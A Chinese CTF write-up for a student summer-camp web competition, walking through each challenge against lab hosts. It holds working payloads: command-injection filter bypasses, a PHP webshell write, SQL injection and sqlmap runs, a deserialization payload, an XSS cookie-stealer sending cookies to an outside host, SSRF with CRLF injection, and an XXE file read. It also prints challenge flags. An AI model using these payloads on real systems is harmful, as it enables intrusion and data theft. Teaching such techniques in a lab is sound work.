# CNSS2022夏令营_WEB_Writeup


<!--more-->
<!-- # CNSS夏令营_WEB_Writeup -->


> 本篇 Writeup 主要是用于写给新生复现学习的，靶机会开放到中秋应该
> 潜力新生多来点哩，斯哈斯哈🤤

## 🔢 更简单的计算题

![math1](./img/math1.jpeg)

打开网站发现做了前端限制，限制了长度为 5，同时禁用了提交按钮

```html
<form method="post">
    <input type="text" name="re" maxlength="5">
    <input type="submit" value="提交" disabled="">
</form>
```

修改后提交即可

```html
<form method="post">
    <input type="text" name="re">
    <input type="submit" value="提交">
</form>
```

## ⚙️ D3buger

一个俄罗斯方块的小游戏，用 js 脚本禁用了 F12，但是我们可以先打开 F12，再进入页面，或者直接 Ctrl+S 就可得到以下源码

```js
//屏蔽右键菜单
document.oncontextmenu = function(event) {
    if (window.event) {
        event = window.event;
    }
    try {
        var the = event.srcElement;
        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) {
            return false;
        }
        return true;
    } catch (e) {
        return false;
    }
}
//屏蔽粘贴
document.onpaste = function(event) {
    if (window.event) {
        event = window.event;
    }
    try {
        var the = event.srcElement;
        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) {
            return false;
        }
        return true;
    } catch (e) {
        return false;
    }
}
//屏蔽复制
//屏蔽剪切
document.oncut = function(event) {
    if (window.event) {
        event = window.event;
    }
    try {
        var the = event.srcElement;
        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) {
            return false;
        }
        return true;
    } catch (e) {
        return false;
    }
}
//禁止f12
function fuckyou() {
    window.opener=null;
    window.open('','_self');
    window.close(); //关闭当前窗口(防抽)
    window.location = "about:blank"; //将当前窗口跳转置空白页
}
function ck() {
    console.profile();
    console.profileEnd();
    //我们判断一下profiles里面有没有东西，如果有，肯定有人按F12了，没错！！
    if (console.clear) {
        console.clear()
    };
    if (typeof console.profiles == "object") {
        return console.profiles.length > 0;
    }
}
function hehe() {
    if ((window.console && (console.firebug || console.table && /firebug/i.test(console.table()))) || (typeof opera == 'object' && typeof opera.postError == 'function' && console.profile.length > 0)) {
        fuckyou();
    }
    if (typeof console.profiles == "object" && console.profiles.length > 0) {
        fuckyou();
    }
}
hehe();
window.onresize = function() {
    if (window.outerWidth - window.innerWidth > 20 ||
    window.outerHeight - window.innerHeight > 100)
    //判断当前窗口内页高度和窗口高度，嘿嘿
    fuckyou();
}
document.onkeydown = function(event) {
    if ((event.keyCode == 112) || //屏蔽 F1
    (event.keyCode == 113) || //屏蔽 F2
    (event.keyCode == 114) || //屏蔽 F3
    (event.keyCode == 115) || //屏蔽 F4
    // (event.keyCode == 116) || //屏蔽 F5
    (event.keyCode == 117) || //屏蔽 F6
    (event.keyCode == 118) || //屏蔽 F7
    (event.keyCode == 119) || //屏蔽 F8
    (event.keyCode == 120) || //屏蔽 F9
    (event.keyCode == 121) || //屏蔽 F10
    (event.keyCode == 122) || //屏蔽 F11
    (event.keyCode == 123) || //屏蔽 F12
    ((event.ctrlKey)&&(event.keyCode==85))) //Ctrl + U
    //其实还有 Ctrl + Shift + I 和 Ctrl +Shift + C
    {
        return false;
    }
}
window.onhelp = function() {
    return false;
}

// 如你所见的，
// 菜狗 xlykle 是根本不会写网页的，
// 俄罗斯方块是 zhihu 抄的，
// js 代码是逛博客时偷的，
// 只剩 [敢 杀 我 的 马] 是我自己找的了。
// 套个娃应该是难不住你的......
// 算了还是直接给吧（记得取一下本题彩蛋😘
// CNSS{Wh@t_A_Sham3le55_thI3f}
```

## 🚩 Signin

打开网站后发现提示 **Please Change Your Method!**

那么我们抓包（还不会的新生建议下一个 Burp Suite）后修改请求方式为 POST，可以得到源码

![signin](./img/signin.jpeg)

```php
<?php
error_reporting(0);
require_once("flag.php");
if($_SERVER['REQUEST_METHOD'] !=='POST'){
    die("Please Change Your Method!");
    exit();
}else{
    if(!isset($_POST["CNSS"])){
        show_source(__FILE__);
    }
    else if($_POST["CNSS"] === "join"){
        if((isset($_GET["web"])) && (($_GET["web"]) === "like")){
            setcookie("flag","0");
            if($_COOKIE['flag'] === '1'){
                echo $flag;
            }else{show_source(__FILE__);}
        }else{
            show_source(__FILE__);
        }
    }
}
```

那么很简单，只需要我们根据要求传参数即可

```http
POST /?web=like HTTP/1.1
Host: 8.130.29.197:6001
Content-Length: 9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://8.130.29.197:6001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6
Cookie: flag=1
Connection: close

CNSS=join
```

## 🔢 更坑的计算题

![math2](./img/math2.jpeg)

需要在1s内计算出正确答案并提交，通过源码，我们可以发现+1s的按钮是安慰剂，

```html
<script>
var fool = document.getElementById("fool");
var eggs = document.getElementById("eggs");
fool.count = 0;
fool.onclick = function() {
    eggs.innerHTML = ++ this.count;
}
// 上帝对每个人都是公平的，你们只有 1s 的时间
</script>
```

预期解是使用脚本提交（脚本什么的当然是py最方便了

```python
import requests
import re
url = 'http://8.130.29.197:6003/'
session = requests.session()
response = session.get(url)
getEquation = re.findall(r'<p>(.*?)=</p>', response.text)[0]
formData = {"res": eval(getEquation)}
re2 = session.post(url, data=formData)
print(re2.text)
```

这里需要注意的是，提交时需要使用同一个 Session，不然算式是会刷新的

## 🇨🇳 China Flag

这题有点偏脑洞题，打开链接后有一张可以点击的图片，点击跳转到 ./china.php。

回显 **我的朋友，你从哪儿找来的**，联想到 HTTP 报头中的 Referer，修改`Referer=http://8.130.29.197:6004/index.php`

回显 **你真的是土生土长的拆尼斯🐴**，指的是代理需要为本地，修改`X-Forwarded-For: 127.0.0.1`

回显 **我们中国人不吃🐏大人那套**，考虑报头中中国人和🐏大人的区别可能指的是语言，修改`Accept-Language: zh-CN,zh;q=0.9`得到flag

最终`payload`：

```http
GET /china.php HTTP/1.1
Host: 8.130.29.197:6004
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Length: 0
X-Forwarded-For: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://8.130.29.197:6004/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

## 🤥 Trick

访问页面直接得到源码

```php
<?php
    error_reporting(0);
    require_once("flag.php");
    show_source(__FILE__);
    $pass = '0e0';
    $md55 = $_COOKIE['token'];
    $md55 = md5($md55);
    if(md5($md55) == $pass){
        if(isset($_GET['query'])){
            $before = $_GET['query'];
            $med = 'filter';
            $after = preg_replace(
                "/$med/", '', $before
            );
            if($after === $med){
                echo $flag1;
            }
        }
        $verify = $_GET['verify'];
    }
    extract($_POST);
    if(md5($verify) === $pass){
        echo $$verify;
    }
?>
```

逐行审计，我们首先需要将传入的 token 进行两次 md5 加密后 == 0e0，这里发现是弱比较

> 弱比较时，变量类型会强制转化，0e开头的纯数字字符串会被转化为科学计数法数字
>
> 那么就有  ‘0e1145141919810’ == 0e0

贴一下爆破脚本（建议自己跑一遍嗷

```python
import string
import hashlib
payload = string.ascii_letters + string.digits
def calc_md5(s):
    md5 = hashlib.md5(s.encode("utf-8")).hexdigest()
    md5_double = hashlib.md5(md5.encode("utf-8")).hexdigest()
    if (md5_double[0:2] == "0e" and md5_double[2:].isdigit()):
        print(s)
def getstr(payload, s, slen):
    if (len(s) == slen):
        calc_md5(s)
        return s
    for i in payload:
        sl = s + i
        getstr(payload, sl, slen)
# 字符串长度从0到30，肯定找得到
for i in range(3, 30):
    getstr(payload, '', i)
```

这样我们就绕过了第一个 if，接下来需要我们 GET 一个 query 使得经过 preg_replace 单次过滤后为 filter。

考虑双写绕过，即`?query=ffilterilter`，这样就得到了 $flag1

然后需要再 GET 一个 verify，这里发现有一行可疑代码`extract($_POST);`，直接 Google

> extract 会导致变量被覆盖，POST 则使得变量可控

那么我们只需要 POST 使`pass=md5(verify)`即可绕过

再观察最后一行 `echo $$verify;`，发现有两个 $$，这就允许我们设置 verify 为某一个变量，再获得这一个变量的值。考虑前半个 flag  为 $flag1，那么我们可以猜测后半部分 flag 为 $flag2

那么后半部分的 payload 为 GET  `verify=flag2`，POST `pass=9a48ddad2656385fce58af47a0ef56cf`

## ⬛ Black Page

F12 发现提示

```php
<?phps
$file = $_GET["file"];
$blacklist = "(**blacklist**)";
if (preg_match("/".$blacklist."/is",$file) == 1){
  exit("Nooo,You can't read it.");
}else{
  include $file;
}
//你能读到 mybackdoor.php 吗？
```

尝试  ?file=mybackdoor.php，但是没有发现回显。

>  因为正常读取时是无法读取它的源码的，它会被当做 php 文件执行
>
> php://filter 是 php 中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取
>

| 名称                      | 描述                                                         | 备注 |
| ------------------------- | ------------------------------------------------------------ | :--: |
| resource=<要过滤的数据流> | 指定了你要筛选过滤的数据流。                                 | 必选 |
| read=<读链的筛选列表>     | 可以设定一个或多个过滤器名称，以管道符（\|）分隔。           | 可选 |
| write=<写链的筛选列表>    | 可以设定一个或多个过滤器名称，以管道符（\|）分隔。           | 可选 |
| <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 | 可选 |

所以可以使用 `?file=php://filter/convert.base64-encode/resource=mybackdoor.php`得到 base64 加密的源码

```
PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBibGFja2xpc3QoJGNtZCl7CiAgJGZpbHRlciA9ICIoXFw8fFxcPnxGbDRnfHBocHxjdXJsfCB8MHh8XFxcXHxweXRob258Z2NjfGxlc3N8cm9vdHxldGN8cGFzc3xodHRwfGZ0cHxjZHx0Y3B8dWRwfGNhdHzDl3xmbGFnfHBofGhwfHdnZXR8dHlwZXx0eXxcXCRcXHtJRlNcXH18aW5kZXh8XFwqKSI7CiAgaWYgKHByZWdfbWF0Y2goIi8iLiRmaWx0ZXIuIi9pcyIsJGNtZCk9PTEpeyAgCiAgICAgIGV4aXQoJ0dvIG91dCEgVGhpcyBibGFjayBwYWdlIGRvZXMgbm90IGJlbG9uZyB0byB5b3UhJyk7CiAgfQogIGVsc2V7CiAgICBzeXN0ZW0oJGNtZCk7CiAgfQp9CmJsYWNrbGlzdCgkX0dFVFsnY21kJ10pOwo/Pg==
```

解密后得到源码：

```php
<?php
error_reporting(0);
function blacklist($cmd){
  $filter = "(\\<|\\>|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\{IFS\\}|index|\\*)";
  if (preg_match("/".$filter."/is",$cmd)==1){  
      exit('Go out! This black page does not belong to you!');
  }
  else{
    system($cmd);
  }
}
blacklist($_GET['cmd']);
?>
```

是黑名单过滤的 rce，那么我们只需要随便绕就行了

先读目录，发现空格被过滤了，可以用 %09 绕过，`/mybackdoor.php?cmd=ls%09/`

发现根目录下有文件 Fl4g_is_here，使用 tac 和 ? 可以绕过，`/mybackdoor.php?cmd=tac%09/Fl4?_is_here`

## ☯️ 太极掌门人

访问得到源码：

```php
<?php
    error_reporting(0);
    show_source(__FILE__);
    function deleteDir($path) {
        if (is_dir($path)) {
            $dirs = scandir($path);
            foreach ($dirs as $dir) {
                if ($dir != '.' && $dir != '..') {
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {
                        deleteDir($sonDir);
                        @rmdir($sonDir);
                    } elseif ($sonDir !== './index.php' && $sonDir !== './flag.php') {
                        @unlink($sonDir);
                    }
                }
            }
            @rmdir($path);
        }
    }
    $devil = '<?php exit;?>';
    $goods = $_POST['goods'];
    file_put_contents($_POST['train'], $devil . $goods);
    sleep(1);
    deleteDir('.');
?>
```

定义的一大段函数是用来删除网站目录下你放进去的文件的，而重点可利用的在最后面几行

~~~    php
    $goods = $_POST['goods'];
    file_put_contents($_POST['train'], $devil . $goods);
    sleep(1);
    deleteDir('.');
~~~

好，发现可疑代码`file_put_contents`，开始 Google

train 作为写入路径，\$devil.\$goods 作为写入内容。这里我们可以使用 php://filter/write=convert.base64-decode/resource= 语句将内容解密后再写入执行代码，这样就可以把开头的退出代码转换为乱码过滤掉。需要注意的是，base64 是分组加密的，所以为了解密时消除开头的 \$devil 且不影响后面的写入内容，我们需要在开头补上一位。

然后便可以在 sleep(1) 内访问，手速快的话可以直接切，预期解是多线程的脚本：

```python
import requests
import base64
from threading import Thread
from time import sleep
url1 = 'http://8.130.29.197:6002/'
url2 = 'http://8.130.29.197:6002/a.php'
data = {
    'goods': b'a'+base64.b64encode(b'<?php system("cat flag.php");?>'),
    'train': 'php://filter/write=convert.base64-decode/resource=a.php'
}
t = Thread(target=requests.post, args=(url1, data))
t.start()
sleep(0.1)
x = requests.get(url2)
print(x.text)
```

## 🥳 To_be_Admin

![A1](./img/A1.jpeg)

打开网址，看到两个提示 **Go to Your page** 和 **Access /read to read file what you want.**

![A2](./img/A2.jpeg)

点击第一个按钮跳转 ./admin 发现权限不够，那么服务器端是依靠什么判断我们是不是 admin 的呢？发现 cookie 内有

token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.STZdzBL4eUV1eQS8V9eJ96m0Q5LTwqBhFw5stXTk89M （直接开始 Google

发现我们需要 jwt 伪造 admin 身份，而伪造需要密钥才能验证。

在 /read 界面，我们可以通过`/read?file=/proc/self/environ`读取环境变量，发现 KEY = `THIS_is_a_KEY`。

那么在 [JSON Web Tokens](https://jwt.io/) 修改 jwt 信息，再访问 /admin 即可

![2](./img/2.jpeg)

## 🏃 第一次跑路

打开是注册界面

![run1](./img/run1.png)

先随便输点啥，点击右侧的注册，跳转回显 **别想了，此路不通**

那么我们再看看登录界面，尝试 sql 注入，输入 username = admin'&password = 123 发现回显 **我超，我👖呢？**

说明可能存在 sqli，使用万能账号登录 `username = admin'or+1=1#&password = 123`

![run2](./img/run2.png)

跳转到了新的页面，尝试过后发现 Cookie: username = cnss 可能存在 Cookie 的 sqli。

![run3](./img/run3.jpeg)

尝试 username = cnss'# 但是发现回显是随机的成功访问或者失败，猜测后端有随机过滤（这里是为了卡 sqlmap），但依然可以 sqli

接下来就是套路化的 sqli 了，先爆库名

 `username=-1'union select group_concat(schema_name) from information_schema.schemata#`

![run4](./img/run4.jpeg)

再爆表名

`username=-1'union select group_concat(table_name) from information_schema.tables where table_schema=database()#`

![run5](./img/run5.jpeg)

再爆列名

`username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='user'#`

`username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='fulage'#`

![run6](./img/run6.jpeg)

最后读取 flag

`username = -1'union select bio from CN55.fulage where id =4#`

![run7](./img/run7.jpeg)

这题里面其实还有 fake flag，但是我这里略去了。希望能够自己摸索一下。

或者可以使用 sqlmap 一把梭了

```bash
 python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie "username=cnss" --level 2 --dbs --hex
 python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie "username=cnss" --level 2 -D CN55 --tables --hex
 python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie "username=cnss" --level 2 -D CN55 -T fulage --dump --hex
```

![run8](./img/run8.png)

## 🤐 To_be_Admin_Again

还是直接审查源码

```php
// index.php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php');
session_start();
highlight_file(__FILE__);
class CNSS{
    private $username = 'guest';
    private $code = 'phpinfo();';
    public function __construct(){
        $this->username = $username;
        $this->code = $cmd;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if($this->username === 'admin'){
            eval($this->code);
        }
    }
}
```

```php
// save.php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
highlight_file(__FILE__);
if (isset($_GET['cnss'])) {
    $_SESSION['cnss'] = $_GET['cnss'];
}
```

发现可疑代码`ini_set('session.serialize_handler','php_serialize');`（开搜

发现这里可能存在**Session序列化选择器漏洞**，可以实现反序列化使 `$code` 可控

这里值得注意的是，在 `class CNSS` 中，`$username,$code` 的类型都是 `private`。反序列化时需要在属性名称前面加上`%00类名%00`。这里为了避免直接序列化`%00`显示乱码的问题，我们可以输出`urlencode`后的`payload`

```php
<?php
class CNSS
{
    private $username = 'admin';
    private $code = 'system("ls /");';
}
$a = new CNSS;
echo '|' . urlencode(serialize($a));
?>
```

然后修改属性数以绕过 `weakup`（反序列化漏洞的基本知识

得到：

`|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A15%3A%22system%28%22ls+%2F%22%29%3B%22%3B%7D`

发现 flag 在根目录下，修改执行代码为 `cat /flag`

所以最终步骤为先访问

```http
http://8.130.29.197:6008/save.php?cnss=|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D
```

再访问

```http
http://8.130.29.197:6008
```

得到 flag

## 😰 To_be_Admin_Again_and_Again

查看 html 源码发现 Message 文本框可以通过闭合 `textarea` 造成 `XSS`

```html
<textarea id="message" name="message" class="form-control input" rows="8"></textarea>
```



在 Message 文本框写入如下内容点击 Preview 按钮，发现 JS 代码被执行了

```html
</textarea><script>alert(1)</script>
```



构造如下 JS 将 `Cookie` 发送到服务器记录

```javascript
var img = new Image();
var cookie = encodeURIComponent(document.cookie);
img.src = 'http://10.0.0.1:7777/?cookie=' + cookie;
document.body.appendChild(img);
```



写个脚本爆破 `SHA256`

```python
import hashlib
import string

table = string.ascii_letters + string.digits


def crack(h):
    for a in table:
        for b in table:
            for c in table:
                for d in table:
                            t = a + b + c + d
                            if hashlib.sha256(t.encode()).hexdigest()[:6] == h:
                                return t
    return None


print(crack('b62936'))
```



提交后可以拿到 bot 访问的时候使用的 `Cookie`

```
[root@iZ2zeglb8irh5gnt1c6x7dZ ~]# nc -lvvp 7777
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 1.117.6.207.
Ncat: Connection from 1.117.6.207:39600.
GET /?cookie=session%3DeyJhZG1pbiI6dHJ1ZX0.YwzeZQ.AXZf3l60naksoRZHWyy0frUZFEI HTTP/1.1
Host: 101.200.202.216:7777
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4430.212 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```



替换 `Cookie` 访问 `/admin` 拿到 flag

## 🤯To_be_Admin_Again_and_Again_and_Again

尝试使用 `file 协议` 读取文件，可以读取，但是读取不到 `/flag`，考虑 flag 不在这个文件

```http
http://1.117.6.207:65006/request?url=file:///etc/passwd
```



看下服务端的进程是通过什么命令启动的

```http
http://1.117.6.207:65006/request?url=file:///proc/self/cmdline
```

```
python app.py
```



尝试读源码， 并没有发现 flag， 考虑 flag 在内网的其他主机上

```http
http://1.117.6.207:65006/request?url=file:///proc/self/cwd/app.py
```

```python
import urllib.parse
import urllib.request

from flask import Flask, request, render_template

app = Flask(__name__)
SCHEME = ['http', 'https', 'file']


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/request')
def req():
    url = request.args.get('url')
    if url:
        if urllib.parse.urlparse(url).scheme not in SCHEME:
            return 'Invalid scheme'
        with urllib.request.urlopen(url) as f:
            return f.read()
    else:
        return 'Please enter a URL'


if __name__ == '__main__':
    app.run('0.0.0.0')


```



读取 `arp` 记录，发现 `172.16.233.233` 有 `MAC 地址` （另一个是网关），考虑到 `Flask` 默认端口为 5000，尝试访问 `http://172.16.233.233:5000`

```http
http://1.117.6.207:65006/request?url=file:///proc/net/arp
```

```
IP address       HW type     Flags       HW address            Mask     Device
172.16.233.245   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.236   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.219   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.225   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.5     0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.230   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.221   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.251   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.248   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.253   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.242   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.233   0x1         0x2         02:42:ac:10:e9:e9     *        eth0
172.16.233.247   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.238   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.227   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.224   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.223   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.229   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.220   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.250   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.252   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.235   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.241   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.232   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.246   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.237   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.1     0x1         0x2         02:42:3c:46:4a:85     *        eth0
172.16.233.226   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.231   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.222   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.228   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.249   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.254   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.243   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.234   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.23    0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.240   0x1         0x0         00:00:00:00:00:00     *        eth0
172.16.233.239   0x1         0x0         00:00:00:00:00:00     *        eth0


```



顺利拿到内网主机的源码， 分析后发现，请求的时候需要带上 `Cookie` 并且要有 `admin=6a9e47ca067b07047e3d571512ec4f82`，考虑 `urlib`的 `CLRF` 漏洞 `CVE-2019-9740` 和 `CVE-2019-9947` 

```
http://1.117.6.207:65006/request?url=http://172.16.233.233:5000
```

```
Try /source ?
```

```
http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/source
```

```python
from flask import Flask, request

app = Flask(__name__)


@app.route('/')
def index():
    return 'Try /source ?'


@app.route('/source')
def source():
    with open('app.py') as f:
        return f.read()


@app.route('/admin')
def admin():
    c = request.cookies.get('admin')
    if c and c == '6a9e47ca067b07047e3d571512ec4f82':
        with open('/flag') as f:
            return f.read()
    else:
        return 'Only admin can read the flag'


if __name__ == '__main__':
    app.run('0.0.0.0')


```



成功拿到 flag

```
http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/admin%20HTTP/1.1%0d%0aCookie:%20admin=6a9e47ca067b07047e3d571512ec4f82%0d%0aheader:%20
```

```
CNSS{ssrf&urllib_ar3_dddddd4nger0us}
```

##  💉 Inject me

下载附件，先在本地跑起来 `java -jar summer-0.0.1.jar ` 然后用 jadx 反编译，注意到配置文件 `Resources/BOOT-INF/classes/application.yml`

```yaml
server:
  address: 0.0.0.0
  port: 5000
spring:
  application:
    name: cnss-summer
config:
  method: SUMMMMMER
  auth:
    len: 4
    expire: 5000
  command:
    allow: 127.0.0.1
    blacklist: rm, cat, tac, mv, touch, mkdir, rmdir, whoami, ls
```

确认可以访问 `http://127.0.0.1:5000` 



接下来分析一下 `Controller` ，定位到 `com.cnss.summer.controller` 包下，主要看一下注解 `@RequestMapping` `@GetMapping` `@PostMapping` ，发现下面三个注册的路由

```java
// /cnss/summer/login
public ResponseEntity login(@NotNull @Valid @RequestBody LoginParam credentials, HttpServletRequest request) {
    String uuid = UUID.randomUUID().toString();
    log.info("uuid: {}", uuid);
    String uuid2 = DigestUtils.md5DigestAsHex(uuid.getBytes(StandardCharsets.UTF_8));
    request.getSession().setAttribute("username", credentials.getUsername());
    request.getSession().setAttribute("token", uuid2);
    request.getSession().setAttribute("timestamp", Long.valueOf(System.currentTimeMillis()));
    HashMap<String, String> map = new HashMap<>();
    map.put("token", uuid2);
    return new ResponseEntity("200", "Login success!", map);
}
```

```java
// /cnss/summer/parse
public ResponseEntity parse(@NotNull @RequestBody ParseParam payload, @RequestParam("nammmmme") @NotEmpty @Valid String username, HttpServletRequest request) throws Exception {
    String username1 = (String) request.getSession().getAttribute("username");
    if (!Objects.equals(username, username1) || !Objects.equals(payload.getUsername(), username1)) {
        throw new Exception();
    }
    Reader stringReader = new StringReader(payload.getXml());
    SAXReader reader = new SAXReader();
    Document document = reader.read(stringReader);
    Element root = document.getRootElement();
    return new ResponseEntity("200", "Parse success!", root.getText());
}
```

```java
// /cnss/doCmd
public void doCmd(@RequestParam String cmd, HttpServletRequest request) throws IOException {
    if (cmd == null) {
        return;
    }
    for (String str : this.config.getBlacklist()) {
        if (cmd.contains(str)) {
             return;
        }
    }
    Process process = new ProcessBuilder("/bin/sh", "-c", cmd).start();
    try {
        process.waitFor();
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
}
```



再分析一下 `Filter` 定位到 com.cnss.summer.filter

```java
// /cnss/summer/parse
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
    String token;
    HttpServletRequest request = (HttpServletRequest) servletRequest;
    if (!Objects.equals(request.getMethod(), this.config.getMethod()) || (token = (String) request.getSession().getAttribute("token")) == null) {
       return;
    }
    long timestamp = ((Long) request.getSession().getAttribute("timestamp")).longValue();
    long now = System.currentTimeMillis();
    if (now - timestamp > this.config.getExpire()) {
        return;
    }
    String token2 = token.substring(0, this.config.getAuthLen());
    String uuid = request.getHeader("UUID");
    if (!Objects.equals(token2, DigestUtils.md5DigestAsHex(uuid.getBytes(StandardCharsets.UTF_8)).substring(0, this.config.getAuthLen()))) {
        request.getSession().invalidate();
        return;
    }
    request.getSession().setAttribute("timestamp", Long.valueOf(now));
    filterChain.doFilter(servletRequest, servletResponse);
}
```

```java
// /cnss/doCmd
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
    HttpServletRequest request = (HttpServletRequest) servletRequest;
    String client = request.getRemoteAddr();
    if (!client.equals(this.config.getAllow())) {
         return;
    }
    filterChain.doFilter(servletRequest, servletResponse);
}
```



可以看到，能够直接请求的接口只有 `/cnss/summer/login` ， 在请求的时候需要 POST的内容为 `LoginParam`

```java
public class LoginParam {
    @JsonProperty("us3rname")
    @NotEmpty
    private String username;
    @JsonProperty("p@ssword")
    @NotEmpty
    private String password;
}
```



所以POST的内容为

```json
{
    "us3rname": "test",
  	"p@ssword": "test"
}
```



返回结果如下

```json
{
  "code": "200", 
  "message": "Login success!", 
  "data": {
    "token": "72600e5c9b1b1340a1b52cf736636c88"
  }
}
```



接下来分析一下 `/cnss/summer/parse` 的 `Filter`

结合配置文件分析， 需要将HTTP请求方法设置为 `SUMMMMMER`

```java
Objects.equals(request.getMethod(), this.config.getMethod())
```



token的有效期只有5秒

```java
now - timestamp > this.config.getExpire()
```



需要在请求头中设置UUID，并且这个UUID的md5的前4位等于token的md5的前4位

```java
String token2 = token.substring(0, this.config.getAuthLen());
String uuid = request.getHeader("UUID");
if (!Objects.equals(token2, DigestUtils.md5DigestAsHex(uuid.getBytes(StandardCharsets.UTF_8)).substring(0, this.config.getAuthLen()))) {
    request.getSession().invalidate();
    return;
}
```



不难用 Python 写出爆破脚本

```python
def crackToken(token):
    table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxzyz1234567890-=!@#$%^&*()_+[]{}"
    for a in table:
        for b in table:
            for c in table:
                for d in table:
                    md5 = hashlib.md5()
                    md5.update((a + b + c + d).encode())
                    if md5.hexdigest()[:4] == token:
                        return a + b + c + d
```



这样就已经能过掉 `Filter` 了，接下来看下需要向这个接口提交的 `ParseParam`

```java
public class ParseParam {
    @NotEmpty
    private String username;
    @NotEmpty
    private String xml;
}
```



提交之后服务端会解析 `ParseParam` 中的 `xml` 显然这里存在 `XXE` 漏洞，构造xml如下

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ 
<!ELEMENT foo ANY >\n
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
